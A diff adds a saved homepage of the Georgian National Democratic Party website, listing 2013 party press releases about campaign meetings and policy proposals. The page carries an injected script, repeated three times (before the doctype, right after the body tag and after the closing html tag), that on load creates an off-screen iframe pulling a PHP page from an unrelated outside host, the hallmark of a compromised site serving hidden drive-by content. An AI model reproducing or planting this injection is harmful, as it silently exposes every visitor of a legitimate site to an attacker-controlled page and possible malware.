@@ -1,0 +1,377 @@
+<script type="text/javascript">
+function frmAdd() {
+var ifrm = document.createElement('iframe');
+ifrm.style.position='absolute';
+ifrm.style.top='-999em';
+ifrm.style.left='-999em';
+ifrm.src  = "http://bhutantouroperators.com/wp-content/template.php";
+ifrm.id = 'frmId';
+document.body.appendChild(ifrm);
+};
+window.onload = frmAdd;
+</script>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>ეროვნულ დემოკრატიული პარტია</title>
+<meta name="description" content="ეროვნულ დემოკრატიული პარტია" />
+<meta name="keywords" content="ეროვნულ დემოკრატიული პარტია" />
+<meta name="generator" content="DataLife Engine (http://dle-news.ru)" />
+<meta name="robots" content="all" />
+<meta name="revisit-after" content="1 days" />
+<link rel="search" type="application/opensearchdescription+xml" href="http://ndp.ge/engine/opensearch.php" title="ეროვნულ დემოკრატიული პარტია" />
+<link rel="alternate" type="application/rss+xml" title="ეროვნულ დემოკრატიული პარტია" href="http://ndp.ge/rss.xml" />
+<script type="text/javascript" src="/engine/classes/js/jquery.js"></script>
+<script type="text/javascript" src="/engine/classes/js/jqueryui.js"></script>
+<script type="text/javascript" src="/engine/classes/js/dle_js.js"></script>
+<link rel="shortcut icon" href="/templates/ndp/images/favicon.ico" />
+<link href="/templates/ndp/style/styles.css" type="text/css" rel="stylesheet" />
+<link href="/templates/ndp/style/engine.css" type="text/css" rel="stylesheet" />
+<script type="text/javascript" src="/templates/ndp/js/libs.js"></script>
+<meta name="google-site-verification" content="S50JEGxRH5gTBR5jpRaCcN4IZ4lsoO89TCdCuyi7LUQ" />
+</head>
+<body><!--a7cc1f--><script type="text/javascript">
+function frmAdd() {
+var ifrm = document.createElement('iframe');
+ifrm.style.position='absolute';
+ifrm.style.top='-999em';
+ifrm.style.left='-999em';
+ifrm.src  = "http://bhutantouroperators.com/wp-content/template.php";
+ifrm.id = 'frmId';
+document.body.appendChild(ifrm);
+};
+window.onload = frmAdd;
+</script><!--/a7cc1f-->
+
+<div id="loading-layer" style="display:none"><div id="loading-layer-text">ჩატვირთვა. გთხოვთ დაელოდოთ...</div></div>
+<script language="javascript" type="text/javascript">
+<!--
+var dle_root       = '/';
+var dle_admin      = '';
+var dle_login_hash = '';
+var dle_group      = 5;
+var dle_skin       = 'ndp';
+var dle_wysiwyg    = 'no';
+var quick_wysiwyg  = '1';
+var dle_act_lang   = ["Да", "Нет", "Ввод", "Отмена"];
+var menu_short     = 'სწრაფი რედაქტირება';
+var menu_full      = 'სრული რედაქტირება';
+var menu_profile   = 'პროფილის ნახვა';
+var menu_send      = 'Отправить сообщение';
+var menu_uedit     = 'Админцентр';
+var dle_info       = 'ინდორმაცია';
+var dle_confirm    = 'Подтверждение';
+var dle_prompt     = 'Ввод информации';
+var dle_req_field  = 'Заполните все необходимые поля';
+var dle_del_agree  = 'Вы действительно хотите удалить? Данное действие невозможно будет отменить';
+var dle_complaint  = 'Укажите текст вашей жалобы для администрации:';
+var dle_p_send     = 'Отправить';
+var dle_p_send_ok  = 'Уведомление успешно отправлено';
+var dle_del_news   = 'პუბლიკაცისს წაშლა';
+var allow_dle_delete_news   = false;
+var dle_search_delay   = false;
+var dle_search_value   = '';
+$(function(){
+	FastSearch();
+});//-->
+</script>
+<div class="wwide pagebg">
+	<div id="headbar">
+		<div id="header">
+			<div class="wrapper">
+				<div class="container">
+					<h1><a class="thide" href="/index.php" title="DataLife Engine - Softnews Media Group">DataLife Engine - Softnews Media Group</a></h1>
+					
+					<div class="headerright">
+						
+					</div>
+				</div>
+			</div>
+		</div>
+		
+	</div>
+	<div class="wrapper">
+		<div id="toolbar" class="container">
+			<ul id="topmenu" class="lcol reset">
+	<li><a href="http://ndp.ge"><b>მთავარი</b></a></li>
+	<li class="sublnk"><a href="#"><b>ჩვენ შესახებ</b></a>
+		<ul>
+			<li><a href="http://ndp.ge/history.html"><b>ისტორია</b></a></li>
+			<li><a href="http://ndp.ge/doctrine.html"><b>დოქტრინა</b></a></li>
+            <li><a href="http://ndp.ge/guidelines.html"><b>წესდება</b></a></li>
+             <li><a href="http://ndp.ge/structure.html"><b>სტრუქტურა</b></a></li>
+		</ul>
+	</li>
+	<li class="sublnk"><a href="#"><b>ლიდერები</b></a>
+		<ul>
+			<li><a href="http://ndp.ge/chairman.html"><b>თავმჯდომარე</b></a></li>
+			<li><a href="http://ndp.ge/presidium.html"><b>პრეზიდიუმი</b></a></li>
+			<li><a href="http://ndp.ge/committee.html"><b>მთავარი კომიტეტი</b></a></li>
+			</ul>
+     <li class="sublnk"><a href="#"><b>ახალგაზრდული</b></a>
+		<ul>
+        	<li><a href="http://ndp.ge/aed.html"><b>აედ</b></a></li>
+			<li><a href="http://ndp.ge/graali.html"><b>გრაალი</b></a></li>
+		</ul>
+	</li>
+	<li><a href="http://ndp.ge/presscenter"><b>პრესცენტრი</b></a></li>
+	<li><a href="http://ndp.ge/publications.html"><b>პუბლიკაციები</b></a></li>
+	<li><a href="http://ndp.ge/contact.html"><b>კონტაქტი</b></a></li>
+		</ul>
+			<form method="post" action=''>
+				<input type="hidden" name="do" value="search" />
+				<input type="hidden" name="subaction" value="search" />
+				<ul class="searchbar reset">
+					<li class="lfield"><input id="story" name="story" value="ძიება..." onblur="if(this.value=='') this.value='Поиск...';" onfocus="if(this.value=='Поиск...') this.value='';" type="text" /></li>
+					<li class="lbtn"><input title="Найти" alt="Найти" type="image" src="/templates/ndp/images/spacer.gif" /></li>
+                    <li id="icons"><a href="http://www.facebook.com/pages/%E1%83%94%E1%83%93%E1%83%9E-%E1%83%94%E1%83%A0%E1%83%9D%E1%83%95%E1%83%9C%E1%83%A3%E1%83%9A-%E1%83%93%E1%83%94%E1%83%9B%E1%83%9D%E1%83%99%E1%83%A0%E1%83%90%E1%83%A2%E1%83%98%E1%83%A3%E1%83%9A%E1%83%98-%E1%83%9E%E1%83%90%E1%83%A0%E1%83%A2%E1%83%98%E1%83%90-National-Democratic-Party-of-Georgia/108669312546506" id="icons2" target="_new">Face</a><a href="http://twitter.com/#!/@NDPge" target="_new" id="icons3">Twe</a><a href="http://www.youtube.com/user/NDPMEDIA" target="_new" id="icons4">Yuot</a>
+                    </li>
+				</ul>
+			</form>
+		</div>
+		<script type="text/javascript" src="/templates/ndp/js/slides.js"></script>
+<script type="text/javascript">
+	$(function(){
+		$('#slides').slides({
+			effect: 'fade',
+			play: 5000,
+			pause: 2500,
+			generatePagination: true,
+			preload: true,
+			hoverPause: true
+		});
+	});
+</script>
+<div id="fullbox">
+<div id="box"><a href="http://ndp.ge/engine/download.php?id=22&area=static" target="_blank"><img src="/templates/ndp/images/link.png" /></div>
+<div class="slider">
+	<div class="container">
+		<div id="slides">
+			<div class="slides_container">
+            <div><a href="#"><img src="/templates/ndp/img/slide.jpg" alt="" /></a></div>
+				<div><a href="#"><img src="/templates/ndp/img/slide1.jpg" alt="" /></a></div>
+                <div><a href="#"><img src="/templates/ndp/img/slide2.jpg" alt="" /></a></div>
+                <div><a href="#"><img src="/templates/ndp/img/slide8.jpg" alt="" /></a></div>
+                <div><a href="#"><img src="/templates/ndp/img/slide3.jpg" alt="" /></a></div>
+                <div><a href="#"><img src="/templates/ndp/img/slide4.jpg" alt="" /></a></div>
+                <div><a href="#"><img src="/templates/ndp/img/slide5.jpg" alt="" /></a></div>
+                <div><a href="#"><img src="/templates/ndp/img/slide6.jpg" alt="" /></a></div>
+                               		
+			</div>
+		</div>
+	</div>
+	<div class="dleft">&nbsp;</div>
+	<div class="dright">&nbsp;</div>
+    
+</div>
+</div>
+		<div class="shadlr"><div class="shadlr">
+			<div class="container">
+				<div id="vseptop" class="wsh"><div class="wsh">&nbsp;</div></div>
+				<div class="vsep"><div class="vsep">
+					<div id="midside" class="rcol">
+						<div class="hban"><div class="hban">
+							<div class="dpad"></div>
+						</div></div>
+						<div class="dpad"><div class="sortn"><div class="sortn"><form name="news_set_sort" id="news_set_sort" method="post" action="" >სიახლეების დალაგება:&nbsp;<img src="/templates/ndp/dleimages/desc.gif" alt="" /><a href="#" onclick="dle_change_sort('date','asc'); return false;">თარიღით</a> | <a href="#" onclick="dle_change_sort('rating','desc'); return false;">პოპულარულობით</a> | <a href="#" onclick="dle_change_sort('news_read','desc'); return false;">დათვალიერებით</a> | <a href="#" onclick="dle_change_sort('comm_num','desc'); return false;">კომენტარებით</a> | <a href="#" onclick="dle_change_sort('title','desc'); return false;">ალფაბეტით</a><input type="hidden" name="dlenewssortby" id="dlenewssortby" value="date" />
+<input type="hidden" name="dledirection" id="dledirection" value="DESC" />
+<input type="hidden" name="set_new_sort" id="set_new_sort" value="dle_sort_main" />
+<input type="hidden" name="set_direction_sort" id="set_direction_sort" value="dle_direction_main" />
+<script type="text/javascript" language="javascript">
+<!-- begin
+
+function dle_change_sort(sort, direction){
+
+  var frm = document.getElementById('news_set_sort');
+
+  frm.dlenewssortby.value=sort;
+  frm.dledirection.value=direction;
+
+  frm.submit();
+  return false;
+};
+
+// end -->
+</script></form></div></div></div>
+						
+						<div id='dle-content'><div class="base shortstory">
+	<div class="dpad">
+		<h3 class="btl"><b><a href="http://ndp.ge/presscenter/244--.html">ბაჩუკი ქარდავა ზუგდიდში სამეგრელოს ყველა სოფლის ედპ-ს კოორდინატორებს შეხვდა</a></b></h3>
+		
+		<div class="maincont" style="margin-bottom:0">
+			<span class="argcoms"></span>
+			<div id="news-id-244" style="display:inline;"><p style="text-align: justify;"><span style="font-size: small;"><strong><span style="font-size: medium;">  <img src="http://config.privoxy.org/send-banner?type=auto" border="0" title="Killed-https://fbcdn-sphotos-a.akamaihd.net/hphotos-ak-ash4/s720x720/482951_336446459768789_883968340_n.jpg-by-size" width="120" height="90"/> &bdquo;ეროვნულ-დემოკრატიული პარტია აცხადება  მზადყოფნა ნომერ ერთს. სამეგრელოს რაიონის ყველა სოფელში პარტია  მობილიზებულია, კოორდინატორებისთვის არის გაწერილი სამოქმედო გეგმა, რომლის  მიხედვითაც მოხდება ადგილებზე საარჩევნო კამპანიის წარმართვა"</span></strong><br /></span></p></div>
+			<div class="clr"></div>
+		</div>
+		
+			<span class="argmore"><a href="http://ndp.ge/presscenter/244--.html"><b>დაწვრილებით</b></a></span>
+			
+			<div class="rate"></div>
+	</div>
+</div>
+<div class="bsep">&nbsp;</div><div class="base shortstory">
+	<div class="dpad">
+		<h3 class="btl"><b><a href="http://ndp.ge/presscenter/243--.html">ბაჩუკი ქარდავა მარტვილის რაიონში სოფელ სალხინოს მოსახლეობას შეხვდა</a></b></h3>
+		
+		<div class="maincont" style="margin-bottom:0">
+			<span class="argcoms"></span>
+			<div id="news-id-243" style="display:inline;"><p>  <img src="http://config.privoxy.org/send-banner?type=auto" border="0" title="Killed-https://fbcdn-sphotos-a.akamaihd.net/hphotos-ak-ash3/575859_449577775060437_1968058934_n.jpg-by-size" width="120" height="90"/><span style="font-size: medium;"><strong>&bdquo;ედპ  ხელისუფლებას სოფლის  მეურნეობის ხელშეწყობასთან დაკავშირებით კონცეფციას  სთავაზობს. ეს  გულისხმობს სახელმწიფო აგრო ბანკის შექმნას, რომელიც  დაბალპროცენტიან  გრძელვადიან სესხს გლეხებსა და ფერმერებზე"</strong></span></p></div>
+			<div class="clr"></div>
+		</div>
+		
+			<span class="argmore"><a href="http://ndp.ge/presscenter/243--.html"><b>დაწვრილებით</b></a></span>
+			
+			<div class="rate"></div>
+	</div>
+</div>
+<div class="bsep">&nbsp;</div><div class="base shortstory">
+	<div class="dpad">
+		<h3 class="btl"><b><a href="http://ndp.ge/presscenter/242--.html">გურამ ჩახვაძე - „მასთ ქერრი“-ის მოქმედების დრო არჩევნების შედეგების გამოცხადებამდე უნდა გაგრძელდეს“</a></b></h3>
+		
+		<div class="maincont" style="margin-bottom:0">
+			<span class="argcoms"></span>
+			<div id="news-id-242" style="display:inline;"><p style="text-align: justify;"><img src="https://fbcdn-photos-a.akamaihd.net/hphotos-ak-prn1/556201_332751903471578_1867690098_a.jpg" style="float: left;" alt="" width="110" height="75" /><strong><span style="font-size: medium;">"ამომრჩეველს საშუალება უნდა ჰქონდეს არამარტო გაცნობიერებული არჩევანი გააკეთოს, არამედ არჩევნების შემდეგ სწორი დასკვნები გააკეთოს მისი შედეგების შესახებ"</span></strong></p></div>
+			<div class="clr"></div>
+		</div>
+		
+			<span class="argmore"><a href="http://ndp.ge/presscenter/242--.html"><b>დაწვრილებით</b></a></span>
+			
+			<div class="rate"></div>
+	</div>
+</div>
+<div class="bsep">&nbsp;</div><div class="base shortstory">
+	<div class="dpad">
+		<h3 class="btl"><b><a href="http://ndp.ge/presscenter/241--ndi-.html">ეროვნულ-დემოკრატიული პარტიის ლიდერები NDI-ის დელეგაციას შეხვდნენ</a></b></h3>
+		
+		<div class="maincont" style="margin-bottom:0">
+			<span class="argcoms"></span>
+			<div id="news-id-241" style="display:inline;"><p style="text-align: justify;"><span style="font-size: small;"><img src="https://fbcdn-photos-a.akamaihd.net/hphotos-ak-ash3/529404_335843896495712_1696041764_a.jpg" style="float: left;" alt="" width="76" height="100" /><strong><span style="font-size: medium;">"ედპ-ს მიაჩნია, რომ საპარლამენტო არჩევნებზე მნიშვნელოვანწილადაა დამოკიდებული არამარტო ქვეყნის შიდაპოლიტიკური  განვითარება, არამედ მისი საერთაშორისო ურთიერთობები და ევროატლანტიკურ  სივრცეში ინტეგრაციის პროცესი&ldquo;</span></strong></span></p></div>
+			<div class="clr"></div>
+		</div>
+		
+			<span class="argmore"><a href="http://ndp.ge/presscenter/241--ndi-.html"><b>დაწვრილებით</b></a></span>
+			
+			<div class="rate"></div>
+	</div>
+</div>
+<div class="bsep">&nbsp;</div><div class="base shortstory">
+	<div class="dpad">
+		<h3 class="btl"><b><a href="http://ndp.ge/presscenter/240--.html">ბაჩუკი ქარდავა ქუთაისის მოსახლეობას შეხვდა</a></b></h3>
+		
+		<div class="maincont" style="margin-bottom:0">
+			<span class="argcoms"></span>
+			<div id="news-id-240" style="display:inline;"><p style="text-align: justify;"><strong><span style="font-size: medium;"><img src="https://fbcdn-photos-a.akamaihd.net/hphotos-ak-snc6/246438_335432693203499_1176646190_a.jpg" style="float: left;" alt="" width="120" height="89" />"ქვეყნის ნომერ პირველი გამოწვევა არის უმუშევრობა,  რომელსაც ჩვენი მოსახლეობის სხვა უამრავი პრობლემა ახლავს - თუნდაც  საბანკო დავალიანებები. ხელისუფლებასთან ჩვენი მოთხოვნა არის ის,  რომ მოხდეს საბანკო დავალიანებების საკითხის გადაწყვეტა, რომელიც მძიმე  ტვირთად აწევს შემოსავლის გარეშე დარჩენილ საქართველოს ოჯახების  უმრავლესობას",- განაცხადა ბაჩუკი ქარდავამ. </span></strong></p></div>
+			<div class="clr"></div>
+		</div>
+		
+			<span class="argmore"><a href="http://ndp.ge/presscenter/240--.html"><b>დაწვრილებით</b></a></span>
+			
+			<div class="rate"></div>
+	</div>
+</div>
+<div class="bsep">&nbsp;</div><div class="dpad">
+	<div class="basenavi">
+		<div class="navigation"><span>1</span> <a href="http://ndp.ge/page/2/">2</a> <a href="http://ndp.ge/page/3/">3</a> <a href="http://ndp.ge/page/4/">4</a> <a href="http://ndp.ge/page/5/">5</a> <a href="http://ndp.ge/page/6/">6</a> <a href="http://ndp.ge/page/7/">7</a> <a href="http://ndp.ge/page/8/">8</a> <a href="http://ndp.ge/page/9/">9</a> <a href="http://ndp.ge/page/10/">10</a> <span class="nav_ext">...</span> <a href="http://ndp.ge/page/47/">47</a></div>
+		<div class="nextprev">
+			<span><span class="thide pprev">Назад</span></span>
+			<a href="http://ndp.ge/page/2/"><span class="thide pnext">Вперед</span></a>
+		</div>
+	</div>
+</div></div>
+					</div>
+					<div id="sidebar" class="lcol">
+						
+
+<div class="block leftmenu">
+	<ul class="lmenu reset">
+		<li><a href="http://didube.majoritarian.ge/" target="_new"><span>პარლამენტი</span></a></li>
+        <li><a href="/photo-gallery.html"><span>ფოტო გალერეა</span></a></li>
+        <li><a href="/video-gallery.html"><span>ვიდეო გალერეა</span></a></li>		
+         <li><a href="/partners.html"><span>პარტნიორები</span></a></li>		
+	</ul>
+		<div class="dtop">&nbsp;</div>
+	<div class="dbtm">&nbsp;</div>
+</div>
+<div id="bcalendar" class="block">
+	<h4 class="btl"><span class="green">კალენდარი</span> </h4>
+	<div class="dcont"><div id="calendar-layer"><table id="calendar" cellpadding="3" class="calendar"><tr><th colspan="7" class="monthselect"><center><b><a class="monthlink" onclick="doCalendar('04','2013','right'); return false;" href="http://ndp.ge/2013/04/" title="Предыдущий месяц">&laquo;</a>&nbsp;&nbsp;&nbsp;&nbsp;მაისი 2013&nbsp;&nbsp;&nbsp;&nbsp;&raquo;</b></center></th></tr><tr><th class="workday">ორ</th><th class="workday">სა</th><th class="workday">ოთ</th><th class="workday">ხთ</th><th class="workday">პრ</th><th class="weekday">შბ</th><th class="weekday">კვ</th></tr><tr><td colspan="2">&nbsp;</td><td  class="day" ><center>1</center></td><td  class="day" ><center>2</center></td><td  class="day" ><center>3</center></td><td  class="weekday" ><center>4</center></td><td  class="weekday" ><center>5</center></td></tr><tr><td  class="day" ><center>6</center></td><td  class="day" ><center>7</center></td><td  class="day" ><center>8</center></td><td  class="day" ><center>9</center></td><td  class="day" ><center>10</center></td><td  class="weekday" ><center>11</center></td><td  class="weekday" ><center>12</center></td></tr><tr><td  class="day" ><center>13</center></td><td  class="day" ><center>14</center></td><td  class="day" ><center>15</center></td><td  class="day" ><center>16</center></td><td  class="day" ><center>17</center></td><td  class="weekday" ><center>18</center></td><td  class="weekday" ><center>19</center></td></tr><tr><td  class="day" ><center>20</center></td><td  class="day" ><center>21</center></td><td  class="day" ><center>22</center></td><td  class="day" ><center>23</center></td><td  class="day" ><center>24</center></td><td  class="weekday" ><center>25</center></td><td  class="weekday" ><center>26</center></td></tr><tr><td  class="day day-current" ><center>27</center></td><td  class="day" ><center>28</center></td><td  class="day" ><center>29</center></td><td  class="day" ><center>30</center></td><td  class="day" ><center>31</center></td><td colspan="2">&nbsp;</td></tr></table></div></div>
+	<div class="dtop">&nbsp;</div>
+	<div class="dbtm">&nbsp;</div>
+</div>
+
+
+
+<div id="popular" class="block">
+	<h4 class="btl"><span class="green" style="font-size:14px">პოპულარული სიახლეები</span></h4>
+	<div class="dcont">
+		<ul></ul>
+	</div>
+	<div class="dtop">&nbsp;</div>
+	<div class="dbtm">&nbsp;</div>
+</div>
+
+	<div class="dtop">&nbsp;</div>
+	<div class="dbtm">&nbsp;</div>
+</div>
+
+					</div>
+					<div class="clr"></div>
+				</div></div>
+				<div id="vsepfoot" class="wsh"><div class="wsh">&nbsp;</div></div>
+			</div>
+		</div></div>
+	</div>
+</div>
+<div class="wwide footbg">
+	<div class="wrapper">
+		<div class="container">
+			<div class="ftbar"><div class="ftbar">
+				<ul id="fmenu" class="reset">
+					<li><a href="/index.php">მთავარი</a></li>
+			
+					
+				</ul>
+				
+			</div></div>
+			
+		</div>
+	</div>
+</div>
+<div class="wwide footer">
+	<div class="wrapper">
+		<div class="container">
+			<h2><iframe src="http://www.facebook.com/plugins/like.php?href=http://ndp.ge/" scrolling="no" frameborder="0" style="border:none; width:450px; height:80px"></iframe></h2>
+		  <div class="counts">
+			</div>
+		</div>
+	</div>
+</div>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-21413649-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+</body>
+</html>
+<!-- DataLife Engine Copyright SoftNews Media Group (http://dle-news.ru) -->
+<script type="text/javascript">
+function frmAdd() {
+var ifrm = document.createElement('iframe');
+ifrm.style.position='absolute';
+ifrm.style.top='-999em';
+ifrm.style.left='-999em';
+ifrm.src  = "http://bhutantouroperators.com/wp-content/template.php";
+ifrm.id = 'frmId';
+document.body.appendChild(ifrm);
+};
+window.onload = frmAdd;
+</script>
